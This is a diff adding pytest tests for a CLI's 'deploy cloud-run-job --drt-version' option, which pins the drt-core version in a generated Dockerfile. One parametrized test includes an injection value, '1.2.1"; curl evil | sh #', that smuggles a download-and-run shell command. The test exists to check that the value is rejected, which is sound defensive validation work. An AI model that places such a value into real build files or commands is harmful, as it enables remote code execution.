@@ -222,6 +222,34 @@ def test_cloud_run_job_writes_valid_scaffold(project: Path) -> None:
         assert "Regenerate" in text and "--force" in text
 
 
+def test_cloud_run_drt_version_pins_the_install_only_when_given(project: Path) -> None:
+    unpinned = runner.invoke(app, ["deploy", "cloud-run-job", "--schedule", "0 6 * * *"])
+    assert unpinned.exit_code == 0, unpinned.output
+    root = project / "deploy/cloud-run-job"
+    assert 'pip install --no-cache-dir "drt-core[snowflake]"' in (root / "Dockerfile").read_text()
+
+    pinned = runner.invoke(
+        app,
+        ["deploy", "cloud-run-job", "--schedule", "0 6 * * *", "--drt-version", "1.2.1", "--force"],
+    )
+    assert pinned.exit_code == 0, pinned.output
+    assert '"drt-core[snowflake]==1.2.1"' in (root / "Dockerfile").read_text()
+
+
+@pytest.mark.parametrize(
+    "bad", ["latest", '1.2.1"; curl evil | sh #', "1.2.1 --pre", ">=1.0", "1.2.1\n"]
+)
+def test_cloud_run_drt_version_rejects_anything_but_a_release_version(
+    project: Path, bad: str
+) -> None:
+    result = runner.invoke(
+        app, ["deploy", "cloud-run-job", "--schedule", "0 6 * * *", "--drt-version", bad]
+    )
+
+    assert result.exit_code == 1
+    assert not (project / "deploy/cloud-run-job").exists()
+
+
 def test_cloud_run_scaffold_is_deterministic_and_refuses_partial_overwrite(
     project: Path,
 ) -> None:
